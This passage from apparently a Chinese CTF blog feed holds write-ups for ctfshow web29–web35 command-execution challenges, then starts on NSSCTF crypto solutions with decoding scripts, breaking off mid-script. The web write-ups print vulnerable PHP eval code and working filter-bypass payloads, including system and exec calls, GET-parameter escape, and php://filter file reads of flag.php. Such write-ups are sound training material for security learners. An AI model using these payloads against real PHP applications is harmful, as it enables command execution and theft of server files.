22.00.23.png)</p><p>![截屏2025-08-08 22.00.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 22.00.08.png)</p><p>攻击结果：</p><p>![截屏2025-08-08 21.59.24](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 21.59.24.png)</p><p>访问url/72/20/得到结果。</p><hr><h2 id="44-web29"><a href="#44-web29" class="headerlink" title="44 web29"></a>44 web29</h2><p>🚩 flag：<code>ctfshow{78cbf3b8-fc58-4787-bdaa-65ae5e18e659}</code></p><p>💡 hint：  <code>代码执行</code> <code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><p>使用<code>https://5c48eb3b-d7ab-443b-814e-c7d1f00eb6e3.challenge.ctf.show/?c=phpinfo();</code>可以得到phpinfo。</p><p>使用<code>https://5c48eb3b-d7ab-443b-814e-c7d1f00eb6e3.challenge.ctf.show/?c=system(%27ls%27);</code>可以得到目录信息。</p><p>直接使用url/flag.php，被过滤，无法查看。</p><p>这里使用<code>https://5c48eb3b-d7ab-443b-814e-c7d1f00eb6e3.challenge.ctf.show/?c=system(%22cp%20flag.php%201.txt%22);</code></p><p>这里还是被过滤，把上上一步的<code>flag.php</code>换成<code>fla?.php</code>。</p><p>![截屏2025-08-08 22.13.41](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 22.13.41.png)</p><hr><h2 id="45-web30"><a href="#45-web30" class="headerlink" title="45 web30"></a>45 web30</h2><p>🚩 flag：<code>ctfshow{b11399b2-1434-46fb-af40-b1805cec3e13}</code></p><p>💡 hint：<code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><p>这个题目过滤的比上一个更多。</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">/?c=<span class="title function_ invoke__">exec</span>(<span class="string">'cp fla* 1.txt'</span>);</span><br></pre></td></tr></tbody></table></figure><p>然后查看<code>url/1.txt</code></p><hr><h2 id="46-web31"><a href="#46-web31" class="headerlink" title="46 web31"></a>46 web31</h2><p>🚩 flag：<code>ctfshow{e4e6c9b6-dd77-402e-8118-3f435b3ca95c}</code></p><p>💡 hint：<code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>过滤的信息更多。</p><p>空格都过滤了</p><p>做题思路就是绕过过滤</p><p>嵌套异或逃逸：eval()</p><p><strong>&amp;符号</strong> <strong>作为连接并且，使用get的1作为一个参数，传给c，再给1一个赋值，这样就可以跳过对c的过滤。</strong></p><p><strong>这里1就相当于参数逃逸出去了，不属于c</strong></p><p>可以用cat的倒叙tac</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">/?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">'tac flag.php'</span>);</span><br></pre></td></tr></tbody></table></figure><p>会直接将信息显示在页面，不需要查看源代码。</p><hr><h2 id="47-web32"><a href="#47-web32" class="headerlink" title="47 web32"></a>47 web32</h2><p>🚩 flag：<code>ctfshow{397cb00b-a830-47cb-bcf0-1d8951174547}</code></p><p>💡 hint：<code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>过滤了”/flag|system|php|cat|sort|shell|.| |'|`|echo|;|(/i”</p><p>绕过flag 、system、php、cat、sort、shell、. 、空格、’、` 、echo、；、括号</p><p>括号也被过滤了，web31的方法行不通</p><p>文件包含include(）</p><p>/?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p><p>php://filter/convert.base64-encode/resource是过滤器也是伪协议，意思是通过指定的通道来读取某个文件</p><p>分析：</p><p>?c=include%0a$_GET[1]?&gt;：通过GET请求传递参数”c”，并使用include函数来包含指定的文件。在这个payload中，使用”%0a”来表示换行符”\n”，使得$_GET[1]能够被解析为一个新的变量。最终的目的是执行从GET参数”1”中获取的文件路径。</p><p>1=php://filter/convert.base64-encode/resource=flag.php：使用GET请求传递参数”1”，该参数的值为php://filter/convert.base64-encode/resource=flag.php。这是一种特殊的文件包含方式，其中php://filter用于对文件进行过滤和转换，convert.base64-encode表示将文件内容进行Base64编码，而resource=flag.php指定了要读取的文件为flag.php。</p><p>二者用&amp;连接，参数”1”可变，前后要一致</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">/?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></tbody></table></figure><p>获得base64编码的信息。</p><p>![截屏2025-08-08 22.33.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 22.33.33.png)</p><p>进行解码：</p><p>![截屏2025-08-08 22.33.58](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-08 22.33.58.png)</p><hr><h2 id="48-web33"><a href="#48-web33" class="headerlink" title="48 web33"></a>48 web33</h2><p>🚩 flag：<code>ctfshow{7e0a9041-46ee-41c3-94f3-34dbdef0c9a5}</code></p><p>💡 hint：<code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>方法同web32：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">/?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="49-web34"><a href="#49-web34" class="headerlink" title="49 web34"></a>49 web34</h2><p>🚩 flag：<code>ctfshow{a504f807-c491-4590-86a7-be3114341122}</code></p><p>💡 hint：<code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>方法同web32：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">/?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="50-web35"><a href="#50-web35" class="headerlink" title="50 web35"></a>50 web35</h2><p>🚩 flag：<code>ctfshow{5aebff2e-b97f-4472-a05c-046757d28f84}</code></p><p>💡 hint：<code>命令执行</code></p><p>题目信息：命令执行，需要严格的过滤</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>方法同web32：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">/?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Crypto暑期刷题记录</title>
      <link href="/2026/01/31/CTF-Crypto%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2026/01/31/CTF-Crypto%E6%9A%91%E6%9C%9F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>以下题目来源：nssctf</p><p>❕📓 ‧₊˚ 🦢</p><h2 id="01-鹤城杯-2021-easy-crypto"><a href="#01-鹤城杯-2021-easy-crypto" class="headerlink" title="01 [鹤城杯 2021]easy_crypto"></a>01 [鹤城杯 2021]easy_crypto</h2><p>🚩flag：<code>NSSCTF{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</code></p><p>💡hint：<code>古典密码</code> <code>其他</code> <code>词频分析</code></p><p>核心价值观解码。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    str1 = <span class="built_in">input</span>(<span class="string">'输入要解码的文本：'</span>)</span><br><span class="line">    list1 = [<span class="string">'富强'</span>, <span class="string">'民主'</span>, <span class="string">'文明'</span>, <span class="string">'和谐'</span>, <span class="string">'自由'</span>, <span class="string">'平等'</span>, <span class="string">'公正'</span>, <span class="string">'法治'</span>, <span class="string">'爱国'</span>, <span class="string">'敬业'</span>, <span class="string">'诚信'</span>, <span class="string">'友善'</span>]</span><br><span class="line">    list1 = [list1.index(str1[f1 &lt;&lt; <span class="number">1</span>] + str1[f1 &lt;&lt; <span class="number">1</span> | <span class="number">1</span>]) <span class="keyword">for</span> f1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(str1)/<span class="number">2</span>))]</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    list2 = []</span><br><span class="line">    <span class="keyword">while</span> a &lt; <span class="built_in">len</span>(list1):</span><br><span class="line">        <span class="keyword">if</span> list1[a] &lt; <span class="number">10</span>:</span><br><span class="line">            list2.append(<span class="built_in">str</span>(list1[a]))</span><br><span class="line">        <span class="keyword">elif</span> list1[a] == <span class="number">10</span>:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            list2.append(<span class="built_in">hex</span>(list1[a]+<span class="number">10</span>)[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            list2.append(<span class="built_in">hex</span>(list1[a]+<span class="number">6</span>)[<span class="number">2</span>:])</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">    str1 = <span class="built_in">bytes</span>.fromhex(<span class="string">''</span>.join(list2)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'解码结果：'</span>, str1, <span class="string">'\n'</span>*<span class="number">3</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="02-强网拟态-2021-拟态签到题"><a href="#02-强网拟态-2021-拟态签到题" class="headerlink" title="02 [强网拟态 2021]拟态签到题"></a>02 [强网拟态 2021]拟态签到题</h2><p>🚩flag：<code>NSSCTF{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT}</code></p><p>💡hint：<code>Base家族</code> <code>古典密码</code> <code>其他</code></p><p>Base64 cyberchef自动转化</p><hr><h2 id="03-SWPUCTF-2021-新生赛-crypto8"><a href="#03-SWPUCTF-2021-新生赛-crypto8" class="headerlink" title="03 [SWPUCTF 2021 新生赛]crypto8"></a>03 [SWPUCTF 2021 新生赛]crypto8</h2><p>🚩flag：<code>NSSCTF{cheese_is_power}</code></p><p>💡hint：<code>古典密码</code> <code>其他</code> <code>uuencode</code></p><p>拿到题目之后是：</p><blockquote><p>73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`</p></blockquote><p>根据题目标签推测是uuencode。</p><p>使用网站解码：</p><p><a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a></p><blockquote><p>NSSCTF{cheese_is_power}</p></blockquote><hr><h2 id="04-SWPUCTF-2021-新生赛-crypto7"><a href="#04-SWPUCTF-2021-新生赛-crypto7" class="headerlink" title="04 [SWPUCTF 2021 新生赛]crypto7"></a>04 [SWPUCTF 2021 新生赛]crypto7</h2><p>🚩flag：<code>NSSCTF{md5yyds}</code></p><p>💡hint： <code>md5爆破</code></p><p>题目信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">69f7906323b4f7d1e4e972acf4abfbfc,得到的结果用NSSCTF{}包裹。</span><br></pre></td></tr></tbody></table></figure><p>一眼md5</p><p>使用网站进行解密：<a href="https://www.somd5.com/">https://www.somd5.com</a></p><p>得到结果：</p><blockquote><p>md5yyds</p></blockquote><hr><h2 id="05-SWPUCTF-2021-新生赛-crypto6"><a href="#05-SWPUCTF-2021-新生赛-crypto6" class="headerlink" title="05 [SWPUCTF 2021 新生赛]crypto6"></a>05 [SWPUCTF 2021 新生赛]crypto6</h2><p>🚩flag：<code>NSSCTF{5e110989-dc43-1bd3-00b4-9009206158fe}</code></p><p>💡hint：<code>Base家族</code> <code>古典密码</code></p><p>题目信息：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">var=<span class="string">"************************************"</span></span><br><span class="line">flag=<span class="string">'NSSCTF{'</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">'}'</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br></pre></td></tr></tbody></table></figure><p>梳理加密过程，是先进行base64编码，编码后的字符串再进行base32编码，然后是base16编码。</p><p>那么根据过程返回去，是先16，再32，再64，写脚本解题即可。</p><p>解密脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encoded = <span class="string">"4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base16 decode</span></span><br><span class="line">b16_decoded = base64.b16decode(encoded, casefold=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"After b16 decode:"</span>, b16_decoded)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base32 decode</span></span><br><span class="line">b32_decoded = base64.b32decode(b16_decoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"After b32 decode:"</span>, b32_decoded)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 decode</span></span><br><span class="line">b64_decoded = base64.b64decode(b32_decoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"After b64 decode:"</span>, b64_decoded)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert to string</span></span><br><span class="line">var = b64_decoded.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Original var:"</span>, var)</span><br></pre></td></tr></tbody></table></figure><p>最终flag：</p><blockquote><p>NSSCTF{5e110989-dc43-1bd3-00b4-9009206158fe}</p></blockquote><hr><h2 id="06-SWPUCTF-2021-新生赛-ez-caesar"><a href="#06-SWPUCTF-2021-新生赛-ez-caesar" class="headerlink" title="06 [SWPUCTF 2021 新生赛]ez_caesar"></a>06 [SWPUCTF 2021 新生赛]ez_caesar</h2><p>🚩flag：<code>NSSCTF{youhaveknowcaesar}</code></p><p>💡hint：<code>Base家族</code> <code>古典密码</code> <code>凯撒密码</code></p><p>题目信息：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">plaintext</span>):</span><br><span class="line">    str_list = <span class="built_in">list</span>(plaintext)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> str_list[i].isalpha():</span><br><span class="line">            str_list[i] = str_list[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="string">"A"</span> <span class="keyword">if</span> str_list[i].isupper() <span class="keyword">else</span> <span class="string">"a"</span></span><br><span class="line">            str_list[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(str_list[i]) - <span class="built_in">ord</span>(a) + <span class="number">5</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(a) <span class="keyword">or</span> <span class="number">5</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(str_list)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"*************************"</span></span><br><span class="line"><span class="built_in">str</span> = caesar(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#str="U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ=="</span></span><br></pre></td></tr></tbody></table></figure><p>flag经过题目中凯撒加密得到str，编写脚本进行逆过程即可。</p><p>尝试过先凯撒解密再base64不行，原来是先base64再凯撒解密。</p><p>解题脚本如下：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">plaintext</span>):</span><br><span class="line">    str_list = <span class="built_in">list</span>(plaintext)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> str_list[i].isalpha():</span><br><span class="line">            str_list[i] = str_list[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="string">"A"</span> <span class="keyword">if</span> str_list[i].isupper() <span class="keyword">else</span> <span class="string">"a"</span></span><br><span class="line">            str_list[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(str_list[i]) - <span class="built_in">ord</span>(a) + <span class="number">21</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(a) <span class="keyword">or</span> <span class="number">21</span>)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(str_list)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=<span class="string">"U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ=="</span></span><br><span class="line"><span class="built_in">str</span>=base64.b64decode(<span class="built_in">str</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">flag=caesar(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>NSSCTF{youhaveknowcaesar}</p></blockquote><hr><h2 id="07-SWPUCTF-2021-新生赛-ez-caesar"><a href="#07-SWPUCTF-2021-新生赛-ez-caesar" class="headerlink" title="07 [SWPUCTF 2021 新生赛]ez_caesar"></a>07 [SWPUCTF 2021 新生赛]ez_caesar</h2><p>🚩flag：<code>NSSCTF{whenthepigwanttoeat}</code></p><p>💡hint：<code>凯撒密码</code> <code>ROT</code> <code>古典密码</code></p><p>题目信息：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">AFFPGS{pbatenghyngvbaf!!!},建议直接秒了</span><br></pre></td></tr></tbody></table></figure><p>凯撒密码爆破：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_brute_force</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):  <span class="comment"># 尝试所有可能的位移（1到25）</span></span><br><span class="line">        decrypted = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():  <span class="comment"># 只处理字母</span></span><br><span class="line">                <span 